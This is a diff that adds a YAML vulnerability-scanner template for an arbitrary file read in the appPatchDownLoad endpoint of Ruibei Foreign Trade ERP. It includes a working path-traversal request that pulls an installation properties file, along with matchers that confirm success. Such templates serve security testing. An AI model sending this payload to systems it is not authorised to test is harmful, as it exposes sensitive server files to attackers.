@@ -1,0 +1,31 @@
+id: ruibei-foreign-trade-apppatchdownload-file-read
+info:
+  name: Ruibei Foreign Trade ERP appPatchDownLoad Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    The appPatchDownLoad endpoint of Ruibei Foreign Trade ERP is vulnerable to arbitrary file read, allowing attackers to access sensitive system files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "DESKTOP="
+          - "SYSTEM="
+      - type: word
+        part: header
+        words:
+          - "filename=installvariables.properties"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
